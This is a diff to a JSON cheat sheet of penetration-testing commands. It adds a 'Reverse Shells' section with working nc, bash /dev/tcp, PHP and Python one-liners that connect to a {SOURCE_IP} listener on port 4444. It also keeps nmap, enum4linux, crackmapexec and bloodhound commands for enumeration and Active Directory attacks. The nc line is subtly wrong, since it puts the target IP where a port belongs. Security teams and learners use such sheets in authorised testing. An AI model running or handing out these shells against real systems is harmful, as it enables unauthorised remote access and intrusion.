@@ -1,29 +1,20 @@
 {
-    "Enumeration": [
-        "nmap -sC -sV -oA scan {IP}",
-        "enum4linux -a {IP}",
-        "smbclient -L //{IP}"
+    "Reverse Shells": [
+        "nc -e /bin/sh {TARGET_IP} {SOURCE_IP}",
+        "bash -i >& /dev/tcp/{SOURCE_IP}/4444 0>&1",
+        "php -r '$sock=fsockopen(\"{SOURCE_IP}\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+        "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{SOURCE_IP}\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
     ],
-    "Exploitation": [
-        "searchsploit {IP}",
-        "msfconsole",
-        "nc -lvnp {IP}"
+    "Enumeration": [
+        "nmap -sC -sV -oA scan {TARGET_IP}",
+        "enum4linux -a {TARGET_IP}"
     ],
     "File Transfer": [
-        "wget http://{IP}/file.txt",
-        "scp file.txt {USERNAME}@{IP}:/tmp/",
-        "python3 -m http.server 8000"
+        "wget http://{TARGET_IP}/file.txt",
+        "scp file.txt {USERNAME}@{TARGET_IP}:/tmp/"
     ],
     "Active Directory Attacks": [
-        "crackmapexec smb {IP} -u {USERNAME} -p {PASSWORD}",
-        "bloodhound-python -c All -u {USERNAME} -p {PASSWORD} -d domain.local -dc-ip {IP}"
-    ],
-    "Privilege Escalation": [
-        "sudo -l",
-        "find / -perm -4000 -type f 2>/dev/null",
-        "getcap -r / 2>/dev/null"
-    ],
-    "Remote Access": [
-        "xfreerdp /u:{USERNAME} /p:{PASSWORD} /t:{IP} --dns-server"
+        "crackmapexec smb {TARGET_IP} -u {USERNAME} -p {PASSWORD}",
+        "bloodhound-python -c All -u {USERNAME} -p {PASSWORD} -d domain.local -dc-ip {TARGET_IP}"
     ]
 }
